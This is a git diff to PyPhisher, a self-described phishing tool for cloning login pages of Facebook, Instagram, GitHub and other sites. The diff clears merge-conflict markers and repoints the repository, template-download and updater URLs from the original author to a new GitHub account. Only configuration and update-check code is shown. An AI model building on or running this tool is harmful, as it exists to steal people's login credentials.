@@ -3,13 +3,8 @@
 # Author     : adhikarisubodh9991
 # Version    : 2.1
 # License    : MIT
-<<<<<<< HEAD
 # Copyright  : adhikarisubodh9991 (2021-2026)
 # Github     : https://github.com/adhikarisubodh9991
-=======
-# Copyright  : adhikarisubodh9991 (2021-2026)
-# Github     : https://github.com/adhikarisubodh9991
->>>>>>> a0e2300 (Prepare for GitHub: Update author, URLs, remove GitLab refs)
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # Language   : Python
@@ -224,14 +219,8 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-<<<<<<< HEAD
-repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
-=======
 repo_url = "https://github.com/adhikarisubodh9991/PyPhisher"
-sites_repo = "https://gitlab.com/KasRoudra/pysites"
-websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
->>>>>>> a0e2300 (Prepare for GitHub: Update author, URLs, remove GitLab refs)
+websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip"
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
@@ -956,27 +945,13 @@ def updater():
     if not isfile("files/pyphisher.gif"):
         return
     try:
-<<<<<<< HEAD
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
-=======
-        toml_data = get("https://raw.githubusercontent.com/adhikarisubodh9991/PyPhisher/main/files/pyproject.toml").text
-        pattern = r'version\s*=\s*"([^"]+)"'
-        match = search(pattern, toml_data)
-        if match:
-            gl_ver = match.group(1)
-        else:
-            gl_ver = "404: Not Found"
->>>>>>> a0e2300 (Prepare for GitHub: Update author, URLs, remove GitLab refs)
+        git_ver = get("https://raw.githubusercontent.com/adhikarisubodh9991/PyPhisher/main/files/version.txt").text.strip()
     except Exception as e:
         append(e, error_file)
         git_ver = version
     if git_ver != "404: Not Found" and float(git_ver) > float(version):
         # Changelog of each versions are seperated by three empty lines
-<<<<<<< HEAD
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
-=======
         changelog = get("https://raw.githubusercontent.com/adhikarisubodh9991/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
->>>>>>> a0e2300 (Prepare for GitHub: Update author, URLs, remove GitLab refs)
         clear(fast=True)
         print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
         upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
